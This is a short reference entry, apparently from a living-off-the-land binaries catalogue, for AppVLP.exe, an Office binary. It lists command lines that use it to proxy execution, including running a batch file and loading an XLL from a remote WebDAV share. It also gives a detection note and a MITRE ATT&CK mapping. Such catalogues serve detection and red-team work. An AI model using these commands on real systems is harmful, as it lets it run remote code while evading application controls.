## Appvlp.exe

* Functions: Execute

```
AppVLP.exe \\webdav\calc.bat   

AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe', '', '', 'open', 1)"    

AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')" 
```

Acknowledgements:
* fab - @0rbz_    
* Will - @moo_hax

Code sample:
*

Resources:
* https://github.com/MoooKitty/Code-Execution
* https://twitter.com/moo_hax/status/892388990686347264

Full path:
```
C:\Program Files\Microsoft Office\root\client\appvlp.exe       
C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe       
```

Notes:
Requires Office.

Detection:
Appvlp.exe spawning other process


 
MITRE ATT&CK:
* [Indirect Command Execution](https://attack.mitre.org/wiki/Technique/T1202)
